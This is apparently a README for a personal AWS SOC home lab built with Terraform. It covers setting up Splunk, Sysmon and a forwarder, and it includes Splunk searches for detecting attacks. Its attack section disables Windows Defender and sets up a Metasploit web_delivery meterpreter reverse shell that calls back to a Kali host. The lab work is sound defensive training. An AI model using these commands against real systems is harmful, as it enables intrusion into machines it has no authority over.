
#            My AWS Cloud SOC Home Lab with Terraform

## Table of Contents

1. [Lab Overview](#lab-overview)
2. [Architecture](#architecture)
3. [Prerequisites](#prerequisites)
4. [Terraform Files](#terraform-files)
5. [Deploying the Lab](#deploying-the-lab)
6. [Post-Deployment Configuration](#post-deployment-configuration)
7. [Installing Splunk](#installing-splunk)
8. [Configuring the Windows Victim](#configuring-the-windows-victim)
9. [Installing the SUF](#installing-the-suf)
10. [Fixing Sysmon Permissions](#fixing-sysmon-permissions)
11. [Verifying Logs in Splunk](#verifying-logs-in-splunk)
12. [Running Attacks from Kali](#running-attacks-from-kali)
13. [What to Look For in Splunk](#what-to-look-for-in-splunk)
14. [Key Splunk Searches](#key-splunk-searches)
15. [Cost Management](#key-splunk-searches)


---

## Lab Overview

This is my cloud-based Security Operations Center (SOC) home lab built on AWS using Terraform. 
This lab simulates a real SOC environment where you can:
- Run attacks from a Kali Linux machine against a Windows Victim
- Detect and investigate those attacks using Splunk SIEM
- Learn how Sysmon enriches Windows logs with detailed threat hunting data
- Practice the same detection workflows used by real SOC analysts

### What's in the Lab

| Machine | Role | Instance Type | OS |
|---|---|---|---|
| Splunk Server | SIEM - collects and searches all logs | m7i-flex.large | Ubuntu 22.04 |
| Windows Victim | Target machine - generates logs | t3.small | Windows Server 2022 | 
| Kali Attacker | Attack machine - runs offensive tooling | t3.small | Kali Linux |

### Log Flow

```
Windows Victim
├Sysmon
|    ├EventID 1  - process creation
|    ├EventID 3  - network connection
|    ├EventID 11 - file created
|    └EventID 13 - registry modified
├Windows Event Logs
|    ├Security    - logins, failed auth, privileges
|    ├System      - services, drivers, OS events
|    └Application - software errors, crashes
└Splunk Universal Forwarder (collects both above)
     └Splunk Server - port 9997
          ├index="sysmon"
          ├index="windows"
          └Splunk web UI - port 8000                             
```

---

## Architecture

<img width="636" height="630" alt="image" src="https://github.com/user-attachments/assets/bf34485b-e463-49d5-8599-f32a2ee7af3c" />

---

## Prerequisites

Before deploying the lab you need:
1. AWS Account with credits or billing set up
2. AWS CLI installed - https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-getting-started.html
3. Terraform installed - https://developer.hashicorp.com/terraform/install#windows
4. An AWS Key Pair created in your target region
  - Go to AWS Console -> EC2 -> Key Pairs -> Create Key Pair (Key pair type should remain RSA  and the Private Key file        format should be changed to .pem if not already)
  - Download the .pem file and keep it safe (you will need it to SSH later)
5. Your public IP address - go to https://whatismyip.com/
6. Kali Linux AWS Marketplace subscription
  - Go to AWS Marketplace -> search "Kali Linux" -> Subscribe (it is free)
  - Required before Terraform can launch the Kali Instance

---

## Terraform Files

This lab is defined across 5 Terraform files. Save all files in the same folder.

### File Structure

- **variables.tf** - Stores all variables for use in all .tf files below
- **config.tf** - Sets the Cloud Provider and Version
- **main.tf** - Provider, VPC, Subnet, Internet Gateway, and Route Table
- **instances.tf** - AMI Lookups and EC2 Instances
- **security_groups.tf** - Firewall rules for each machine
- **outputs.tf** - IP's printed after Terraform apply
- **windows_userdata.ps1** - PowerShell script that runs on Windows first boot (Configures SUF and Sysmon on boot. Saves a lot of time... trust me xD)

#### variables.tf

Edit these defaults before deploying:

| Variable | Default | What to Change |
|---|---|---|
| aws_region | us-east-2 | Change if you prefer a different region |
| aws_key | YOUR KEY NAME HERE | Replace with your actual AWS key pair name (The one you made back in Step 4 of the Prequisites section) | 
| my_public_ip | YOUR PUBLIC IP HERE/32 | Replace with your IP in CIDR format |

---

## Deploying the Lab

### Step 1 - Configure AWS credentials

1. #### Configure new user in AWS
  - Go to AWS Console -> IAM -> IAM Users -> Create User
  - Create a username
  - Attach policies directly (AmazonVPCFullAccess + AmazonEC2FullAccess)

2. #### Create an access key
  - Under your newly created IAM User, create access key
  - Choose the "Other" use case
  - Copy your secret access key and save to a Notepad file (You will not be able to access this private key again)

3. #### Install the AWS CLI then run within your WSL:
```bash
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```
> **Note:** I configured the AWS CLI within an Ubuntu WSL on my Windows computer however, the Windows steps can be found in the link in Step 2 of the Prerequisites section

Navigate to your new AWS directory created above and create a new credentials file:
```bash
nano credentials
```
In your credentials file add the following:
```
[default]
aws_access_key_id = REPLACE_WITH_YOUR_PUBLIC_ACCESS_KEY
aws_secret_access_key = REPLACE_WITH_YOUR_PRIVATE_ACCESS_KEY
```

### Step 2 - Running Terraform

1. #### Clone the Github .tf files
Navigate to the new working directory and run:
```bash
git clone https://github.com/jb102002/SOC-Home-Lab.git
```
> **Note:** If git is not installed, simply run sudo apt install git

2. #### Initialize Terraform
```bash
cd SOC-Home-Lab
terraform init
```

3. #### Preview what will be created
```bash
terraform plan
```

4. #### Deploy the lab
```bash
terraform apply -var="aws-key=REPLACE_WITH_NAME_OF_KEY_PAIR"
```
> **Note:** Use the Key Pair you created in the EC2 section not the Access Key

Type "yes" when prompted. Takes 3-5 minutes to complete

5. #### Save your output IPs
When complete, Terraform prints your IPs
```
kali_attacker_public_ip  = "x.x.x.x"
splunk_private_ip        = "10.0.1.x"
splunk_public_ip         = "x.x.x.x"
windows_victim_public_ip = "x.x.x.x"
```
Save these. You need them for the rest of the setup.
> **Note:** Public IPs change every time you stop and restart instances. Always get the current IP from the AWS Console or by running terraform output 

---

## Post-Deployment Configuration

### Fix SSH permissions (Windows PC - One Time Only)

SSH refuses to use the .pem key if other users on your PC can read it. Fix this in PowerShell:
```powershell
$keyPath = "C:\path\to\your\keyfilehere.pem"
icacls $keyPath /inheritance:r
icacls $keyPath /remove "BUILTIN\Users"
icacls $keyPath /remove "Everyone"
icacls $keyPath /grant:r "YOUR-WINDOWS-USERNAME:F"
```

---

## Installing Splunk

### Step 1 - SSH into the Splunk server
```powershell
ssh -i "C:\path\to\your-key.pem" ubuntu@<splunk_public_ip>
```

Type yes when asked about the host fingerprint - this is normal on first connection

### Step 2 - Download Splunk
Get the latest download URL from https://www.splunk.com/en_us/download/splunk-enterprise.html

- Sign in or create a free account
- Select Linux and .tgz format
- Right click Download Now -> Copy link address

```bash
wget -O splunk.tgz "PASTE-YOUR-DOWNLOAD-URL-HERE"
```

### Step 3 - Extract and install

```bash
sudo tar xvzf splunk.tgz -C /opt
export SPLUNK_HOME=/opt/splunk
sudo chown -R ubuntu:ubuntu /opt/splunk
```

### Step 4 - Start Splunk
```bash
$SPLUNK_HOME/bin/splunk start --accept-license
```
> **Note:** It will ask you to create an admin username and password. Remember these - you need them to log into the web UI and run CLI commands.

For convenience sake, run the command below to enable boot start for Splunk
```bash
sudo /opt/splunk/bin/splunk enable boot-start -user ubuntu
```

### Step 5 - Create indexes
The Windows forwarder sends logs to indexes called windows and sysmon. Create them now or Splunk will reject the logs
```bash
/opt/splunk/bin/splunk add index windows -auth YOUR_USERNAME:YOUR_PASSWORD
/opt/splunk/bin/splunk add index sysmon -auth YOUR_USERNAME:YOUR_PASSWORD
```

### Step 6 - Enable Splunk to receive logs on port 9997
This is required for the Splunk Universal Forwarder on Windows Victim to connect
```bash
/opt/splunk/bin/splunk enable listen 9997 -auth YOUR_USERNAME:YOUR_PASSWORD
```

### Step 7 - Restart Splunk
```bash
/opt/splunk/bin/splunk restart
```

### Step 8 - Verify Splunk is accessible
Open your browser on your personal device and go to:
```
http://<splunk_public_ip>:8000
```
Log in with the credentials you created in Step 4.

---

## Configuring the Windows Victim

### Connecting via RDP
1. Open Remote Desktop Connection on your PC
2. Enter the Windows victim public IP in the Computer field
3. Click Show Options -> set username to Administrator
4. Get the Windows password from AWS:
```
AWS Console → EC2 → Instances → select Windows instance →
Actions → Get Windows Password → upload your .pem file → Decrypt Password
```
5. Paste the decrypted password into RDP
> **Note:** The Windows Administrator password from AWS has nothing to do with your Microsoft account password. It's a separate randomly generated password for the EC2 instance.

> **Tip:** If RDP asks for your local PC credentials first, enter your Windows login. This is a security confirmation before opening the RDP session (it's separate from the AWS credentials).

### Installing Sysmon
Sysmon (System Monitor) is a free Microsoft tool that logs detailed system activity not captured by default Windows logs e.g. process creation with full command lines, network connections, file hashes, registry changes, and more.

Open PowerShell as Administrator on the Windows victim and run:
#### Step 1 - Create a working directory
```powershell
New-Item -ItemType Directory -Force -Path "C:\SOCLab"
```

#### Step 2 - Download Sysmon
```powershell
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "C:\SOCLab\Sysmon.zip"
```

#### Step 3 - Extract Sysmon
```powershell
Expand-Archive -Path "C:\SOCLab\Sysmon.zip" -DestinationPath "C:\SOCLab\Sysmon"
```

#### Step 4 - Download SwiftOnSecurity config
This is the industry standard Sysmon config used to filter noise and highlight suspicious activity:
```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "C:\SOCLab\sysmonconfig.xml"
```

#### Step 5 - Install Sysmon as a service
```powershell
C:\SOCLab\Sysmon\Sysmon64.exe -accepteula -i C:\SOCLab\sysmonconfig.xml
```

#### Step 6 - Verify Sysmon is running
```powershell
Get-Service Sysmon64
```
Should show **Running**

---

## Installing the SUF

### Step 1 - Download the installer
Go to https://www.splunk.com/en_us/download/universal-forwarder.html
- Download the 64-bit Windows .msi file
- Save it to C:\SOCLab\splunkforwarder.msi

### Step 2 - Install the forwarder
In PowerShell as Administrator, replace SPLUNK_PRIVATE_IP with your actual Splunk private IP from the Terraform output and replace the placeholder credentials with the credentials used to sign up for Splunk:
```powershell
msiexec.exe /i "C:\SOCLab\splunkforwarder.msi" /quiet AGREETOLICENSE=Yes SPLUNKUSERNAME=admin SPLUNKPASSWORD=SOCLab123! RECEIVING_INDEXER=SPLUNK_PRIVATE_IP:9997
```
### Step 3 - Start the forwarder
```powershell
Start-Service SplunkForwarder
```

### Step 4 - Verify the forwarder is pointing at Splunk
```powershell
& "C:\Program Files\SplunkUniversalForwarder\bin\splunk.exe" list forward-server -auth admin:SOCLab123!
```

---

## Fixing Sysmon Permissions
By default the SplunkForwarder service does not have permission to read the Sysmon event log channel. You will see errors like could not subscribe to Windows event log channel in the forwarder logs.

### The only solution I have found is running as LocalSystem:
```powershell
Stop-Service SplunkForwarder
sc.exe config SplunkForwarder obj= "LocalSystem"
Start-Service SplunkForwarder
```
This gives the forwarder full access to all event log channels
> **Note:** Running as LocalSystem is fine for a lab. In production environments a dedicated service account with minimum permissions would be used instead.

### Verify the fix worked
Check the forwarder log for errors:
```powershell
Get-Content "C:\Program Files\SplunkUniversalForwarder\var\log\splunk\splunkd.log" | Select-String "Sysmon" | Select-Object -Last 20
```
If you no longer see could not subscribe errors the fix worked.

---

## Verifying Logs in Splunk
Open the Splunk web UI at http://<splunk_public_ip>:8000 and go to **Search & Reporting**.

### Check Windows logs are flowing:
```
index=windows
```
You should see Security, System, and Application events from EC2AMAZ-XXXXXXX.

### Check Sysmon logs are flowing
```
index=sysmon
```
You should see XML formatted Sysmon events. EventID 1 (process creation) is the most common.

---

## Running Attacks from Kali

Here will be a couple examples of some basic reconnaisance/attacks an attacker might use.

### SSH into Kali
```powershell
ssh -i "C:\path\to\your-key.pem" kali@<kali_public_ip>
```

### Attack 1 - Port Scan using nmap
```bash
nmap -sV <windows_private_ip>
```
**Expected results:** Ports 3389 (RDP) and 5985 (WinRM) open:

<img width="1112" height="608" alt="kali nmap scan" src="https://github.com/user-attachments/assets/0fe28763-0553-4649-b04f-48688a484d24" />

#### Detect in Splunk 
```
index=windows EventCode=5156 Source_Address=<kali_private_ip>
```

<img width="1706" height="913" alt="actual splunk windows kali nmap scan" src="https://github.com/user-attachments/assets/567caa88-a0f4-4f71-bef9-33e7014640af" />

### Attack 2 - Metasploit Reverse Shell Payload
#### First we want to disable Windows Defender:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
#### Generate a reverse shell payload to run on the Windows machine
```bash
msfconsole
use exploit/multi/script/web_delivery
set target 2 
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <kali_private_ip>
set LPORT 4444
run
```

#### Paste the payload generated by the msfconsole into powershell on the Windows machine

<img width="1229" height="708" alt="Screenshot 2026-05-25 145150" src="https://github.com/user-attachments/assets/35c3d7a8-363d-4056-98c4-b6f1acfe4d8c" />

#### Detect in Splunk 

```
index=sysmon EventID=1
index=sysmon EventID=3
```

<img width="1625" height="654" alt="real sysmon log" src="https://github.com/user-attachments/assets/2c342f73-55c2-4e3e-9a87-2b73fe86dc2e" />

**This was the moment I realised I did not set an ingress rule for the Kali Machine for the listening port of 4444 but you get the point. If you want to play around with some reverse listeners on the Kali Machine, just add another ingress rule in the security_groups.tf file e.g.:**
```terraform 
ingress { 
     description = "Listener"
     from_port   = "4444"
     to_port     = "4444"
     protocol    = "tcp"
     cidr_blocks = [var.vpc_cidr]
}
```

---

##What to Look For in Splunk

###Windows Index - Good for detecting inbound attacks

| EventCode | What It Means | Attack Scenario |
|---|---|---|
| 4624 | Successful logon | Someone logged in |
| 4625 | Failed logon | Brute force attempt | 
| 4672 | Privileged logon | Privilege escalation |
| 4688 | Process created | Malicious process ran |
| 4720 | User account created | Attacker created backdoor account |
| 4732 | User added to group | Privilege escalation |
| 5156 | Firewall allowed connection | Network scan or attack traffic |
| 5152 | Firewall blocked connection | Blocked attack attempt |

###Sysmon Index - Good for detecting inbound attacks

| EventID | What It Means | Attack Scenario |
|---|---|---|
| 1 | Process created | Every command run after exploitation |
| 3 | Network connection | Reverse shell phoning home to Kali | 
| 7 | Image loaded | DLL injection by malware |
| 8 | Remote thread created | Process injection |
| 10 | Process accessed | Mimikatz dumping credentials from LSASS |
| 11 | File created | Malware dropped on disk |
| 12/13 | Registry modified | Malware adding persistence |
| 22 | DNS query | Malware looking up C2 server |

###Understanding the difference

####index=windows tells you what happened from the OS perspective:
- Someone failed to log in 100 times (brute force)
- A new user account was created (persistence)
- A connection was allowed through the firewall (network attack)

####index=sysmon tells you how it happened and what the attacker did after getting in:
- cmd.exe was spawned by malware.exe (execution)
- net user hacker Password1 /add was run (account creation)
- A file was dropped at C:\Windows\Temp\backdoor.exe (malware staging)
- A connection was made back to Kali on port 4444 (reverse shell)

####Together they give you the complete picture of an attack.

---

##Key Splunk Searches

###General
```
# See everything in the last 24 hours
index=windows | head 100

# Count events by type
index=windows | stats count by EventCode | sort -count
index=sysmon | stats count by EventID | sort -count
```

###Detect port scans
```
index=windows EventCode=5156 Direction=Inbound
index=windows EventCode=5156 Source_Address=<kali_private_ip>
```

###Detect brute force attempts
```
index=windows EventCode=4625
index=windows EventCode=4625 | stats count by Source_Network_Address | sort -count
```

###Detect successful logins after brute force
```
index=windows EventCode=4624
```

###Detect process creation (post exploitation)
```
index=sysmon EventID=1
index=sysmon EventID=1 | table _time Image CommandLine User ParentImage
```

###Detect credential dumping 
```
index=sysmon EventID=10 TargetImage="*lsass*"
```

###Detect malware persistence via registry
```
index=sysmon EventID=13
```

###Detect files dropped on disk
```
index=sysmon EventID=11
```

###Full attack timeline
```
index=sysmon OR index=windows | sort _time | table _time index EventID EventCode Image CommandLine Source_Address Destination_Address
```

---

##Cost Management

###Estimated costs (us-east-2)

| Resource | Instance Type | Est. Cost/Hour | Est. Cost/Day | Est. Cost/Month |
|---|---|---|---|---|---|---|---|
| Splunk Server | m7i-flex.large | ~$0.048 | ~$1.15 | ~$35 |
| Windows Victim | t3.small | ~$0.021 | ~$0.50 | ~$15 |
| Kali Attacker | t3.small | ~$0.021 | ~$0.50 | ~$15 |
| EBS Storage | 115GB gp3 | — | ~$0.30 | ~$9 |
| **Total** | | | **~$2.45** | **~$74** |

> **Important:** AWS does not automatically stop instances when credits run out

###Things to note
- If you are on an AWS credits program your instances will stop working when credits are depleted but you will not be charged to a credit card. If you are on a standard AWS account you will be charged beyond your free tier. **Set up a billing alert** (this can be done through creating a cost budget within the Billing section in the AWS Console). 
- Save money by stopping instances when not in use (this can be doen through the instance state dropdown within the instances section under EC2). This drastically reduces costs compared to the estimated cost in the figure above.
- Destroy the lab completely when done using:
     ```powershell
       terraform destroy
     ```
     This permanently deletes everything and stops all charges. You can redeploy from scratch anytime with terraform apply.

---
*Built as a personal SOC home lab by Jacob Boinski for learning threat detection, log analysis, and incident response.*
